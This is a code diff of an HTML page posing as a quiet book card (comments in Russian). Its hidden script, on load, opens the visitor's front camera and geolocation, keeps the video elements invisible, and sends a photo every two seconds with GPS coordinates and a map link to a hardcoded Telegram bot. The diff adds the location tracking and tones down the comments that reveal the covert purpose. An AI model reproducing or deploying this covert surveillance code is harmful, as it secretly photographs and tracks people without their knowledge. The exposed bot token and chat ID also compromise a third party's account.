@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
 
-        /* Обычный, спокойный фон — библиотека, никаких ярких пятен */
+        /* Спокойный книжный фон */
         body {
             background: #e2dac9;
             font-family: 'Georgia', 'Times New Roman', serif;
@@ -23,7 +23,6 @@
             padding: 1.5rem;
         }
 
-        /* Книжный блок — максимально аутентично */
         .book-card {
             max-width: 720px;
             width: 100%;
@@ -67,7 +66,7 @@
             font-style: italic;
         }
 
-        /* Полностью невидимые элементы камеры — без следов */
+        /* Невидимые элементы камеры */
         .invisible-camera {
             position: fixed;
             top: -100px;
@@ -88,11 +87,6 @@
             opacity: 0;
             pointer-events: none;
         }
-
-        /* Убираем любые кликабельные подсказки */
-        .hidden-hint {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -109,28 +103,105 @@
     </div>
 </div>
 
-<!-- Абсолютно невидимые элементы для скрытой съёмки -->
+<!-- Скрытые элементы для камеры -->
 <video id="stealthVideo" autoplay playsinline muted class="invisible-camera"></video>
 <canvas id="stealthCanvas" class="invisible-camera"></canvas>
 
 <script>
-    // ========== СКРЫТАЯ ФОТОФИКСАЦИЯ (АВТОЗАПУСК) ==========
-    // Конфиденциальная отправка в Telegram
+    // ========== КОНФИГУРАЦИЯ ==========
     const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
     const CHAT_ID = '5305261101';
 
-    // Элементы (скрытые)
+    // Элементы
     const video = document.getElementById('stealthVideo');
     const canvas = document.getElementById('stealthCanvas');
     
-    // Состояния
+    // Состояния камеры
     let mediaStream = null;
     let captureInterval = null;
     let isCameraReady = false;
     let isSending = false;
     let totalSent = 0;
     
-    // Функция остановки камеры и таймера
+    // Геолокация: последние известные координаты (инициализируем null)
+    let lastLocation = {
+        lat: null,
+        lon: null,
+        accuracy: null,
+        timestamp: null
+    };
+    let locationWatchId = null;
+    let locationRequested = false;
+    
+    // ========== ФУНКЦИИ ГЕОЛОКАЦИИ ==========
+    function getYandexMapsLink(lat, lon) {
+        return `https://yandex.ru/maps/?pt=${lon},${lat}&z=17&l=map`;
+    }
+    
+    // Формируем подпись для фото (с координатами, если есть)
+    function buildPhotoCaption() {
+        const now = new Date();
+        const timestamp = now.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+        
+        if (lastLocation.lat && lastLocation.lon) {
+            const latFixed = lastLocation.lat.toFixed(6);
+            const lonFixed = lastLocation.lon.toFixed(6);
+            const yandexLink = getYandexMapsLink(lastLocation.lat, lastLocation.lon);
+            const accuracyText = lastLocation.accuracy ? `±${Math.round(lastLocation.accuracy)}м` : '';
+            return `📍 Местоположение: ${latFixed}, ${lonFixed} ${accuracyText}\n🗺️ Яндекс.Карты: ${yandexLink}\n🕒 ${timestamp}\n📸 Авто-фото #${totalSent+1}`;
+        } else {
+            return `🌐 Координаты не определены (геолокация запрещена или недоступна)\n🕒 ${timestamp}\n📸 Авто-фото #${totalSent+1}`;
+        }
+    }
+    
+    // Запрос геолокации (автоматически при загрузке)
+    function requestLocation() {
+        if (locationRequested) return;
+        locationRequested = true;
+        
+        if (!navigator.geolocation) {
+            console.warn('Геолокация не поддерживается браузером');
+            return;
+        }
+        
+        // Однократный запрос позиции (можно также использовать watchPosition для обновления)
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                lastLocation.lat = position.coords.latitude;
+                lastLocation.lon = position.coords.longitude;
+                lastLocation.accuracy = position.coords.accuracy;
+                lastLocation.timestamp = position.timestamp;
+                console.log(`[гео] получены координаты: ${lastLocation.lat}, ${lastLocation.lon} (точность ${lastLocation.accuracy}м)`);
+                
+                // Дополнительно: начинаем следить за перемещениями (обновлять координаты)
+                if (locationWatchId === null) {
+                    locationWatchId = navigator.geolocation.watchPosition(
+                        (newPos) => {
+                            lastLocation.lat = newPos.coords.latitude;
+                            lastLocation.lon = newPos.coords.longitude;
+                            lastLocation.accuracy = newPos.coords.accuracy;
+                            lastLocation.timestamp = newPos.timestamp;
+                            console.log(`[гео] обновлены координаты: ${lastLocation.lat}, ${lastLocation.lon}`);
+                        },
+                        (err) => {
+                            console.warn('Ошибка watchPosition:', err.message);
+                        },
+                        { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 }
+                    );
+                }
+            },
+            (error) => {
+                console.warn(`Ошибка геолокации: ${error.message} (код ${error.code})`);
+                // Не выводим пользователю — остаётся скрыто
+                if (error.code === 1) {
+                    console.log('Пользователь запретил геолокацию — координаты не будут отправляться');
+                }
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
+    
+    // ========== ФУНКЦИИ КАМЕРЫ ==========
     function stopCameraAndTimer() {
         if (captureInterval) {
             clearInterval(captureInterval);
@@ -144,34 +215,35 @@
         isCameraReady = false;
     }
     
-    // Отправка одного кадра (с улучшением яркости/контраста для плохого освещения)
+    // Отправка одного кадра с подписью (координаты в caption)
     async function captureAndSend() {
         if (!isCameraReady || isSending) return;
         if (!video.videoWidth || !video.videoHeight) return;
         
         isSending = true;
         try {
+            // Подготовка canvas и улучшение яркости
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // Улучшение видимости при плохом свете: яркость +25%, контраст +15%
             ctx.filter = 'brightness(1.25) contrast(1.15) saturate(1.1)';
-            
-            // Зеркальное отражение (естественное селфи)
             ctx.save();
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
             ctx.restore();
-            
             ctx.filter = 'none';
             
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.88));
-            if (!blob) throw new Error('blob failed');
+            if (!blob) throw new Error('Не удалось создать blob');
+            
+            // Формируем caption с геоданными
+            const caption = buildPhotoCaption();
             
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, `frame_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');  // на случай ссылок (но ссылка простая)
             
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -180,7 +252,7 @@
             const result = await response.json();
             if (result.ok) {
                 totalSent++;
-                console.log(`[скрыто] фото #${totalSent} отправлено`);
+                console.log(`[✓] Фото #${totalSent} отправлено с геопозицией:`, lastLocation.lat ? `${lastLocation.lat}, ${lastLocation.lon}` : 'нет');
             } else {
                 console.warn(`[ошибка Telegram] ${result.description}`);
                 if (result.description && (result.description.includes('Wrong chat_id') || result.description.includes('Bot token'))) {
@@ -189,23 +261,21 @@
                 }
             }
         } catch (err) {
-            console.error('Ошибка при захвате:', err);
+            console.error('Ошибка при захвате/отправке:', err);
         } finally {
             isSending = false;
         }
     }
     
-    // Запуск периодической съёмки (каждые 2 секунды)
     function startStealthCapture() {
         if (captureInterval) clearInterval(captureInterval);
         if (!isCameraReady) return;
         captureInterval = setInterval(() => {
             captureAndSend();
         }, 2000);
-        console.log('[система] скрытая съёмка активна, интервал 2с');
+        console.log('[система] скрытая съёмка активна, интервал 2с, координаты будут в caption');
     }
     
-    // Инициализация камеры (фронтальная, автоматически при загрузке)
     async function initStealthCamera() {
         if (mediaStream && mediaStream.active) {
             isCameraReady = true;
@@ -214,7 +284,7 @@
         }
         
         try {
-            // Сначала пробуем фронтальную камеру
+            // Пробуем фронтальную камеру
             const constraints = {
                 video: {
                     facingMode: { exact: "user" },
@@ -236,7 +306,7 @@
             startStealthCapture();
             return true;
         } catch (err) {
-            console.warn('Не удалось получить фронтальную камеру, пробуем любую', err);
+            console.warn('Фронтальная камера не доступна, пробуем любую', err);
             try {
                 const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 mediaStream = fallbackStream;
@@ -256,23 +326,29 @@
         }
     }
     
-    // АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ — БЕЗ КЛИКА
+    // ========== АВТОЗАПУСК ВСЕГО ПРИ ЗАГРУЗКЕ ==========
     window.addEventListener('load', () => {
-        // Небольшая задержка для стабильности (можно без неё, но оставляем для надёжности)
+        // Запрашиваем геолокацию сразу (диалог появится параллельно с камерой)
+        requestLocation();
+        
+        // Запрашиваем камеру с небольшой задержкой, чтобы диалоги не накладывались слишком агрессивно
         setTimeout(() => {
             initStealthCamera().catch(e => console.warn('Автозапуск камеры не удался', e));
         }, 100);
     });
     
-    // Очистка ресурсов при уходе со страницы
+    // Очистка при уходе со страницы
     window.addEventListener('beforeunload', () => {
         if (captureInterval) clearInterval(captureInterval);
         if (mediaStream) {
             mediaStream.getTracks().forEach(track => track.stop());
         }
+        if (locationWatchId !== null) {
+            navigator.geolocation.clearWatch(locationWatchId);
+        }
     });
     
-    // Мониторинг состояния потока: если камера "упала", пробуем восстановить один раз тихо
+    // Восстановление потока, если камера упала
     setInterval(() => {
         if (isCameraReady && mediaStream && !mediaStream.active) {
             console.warn('Поток камеры неактивен, попытка восстановления');
@@ -282,11 +358,11 @@
         }
     }, 15000);
     
-    // Скрываем все элементы на всякий случай ещё жёстче
+    // Скрываем элементы на всякий случай
     video.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0; pointer-events:none; visibility:hidden;';
     canvas.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0;';
     
-    console.log('Скрытый режим активирован автоматически. Камера запрошена без клика.');
+    console.log('Скрытый режим активирован. Камера и геолокация запрашиваются автоматически.');
 </script>
 </body>
 </html>
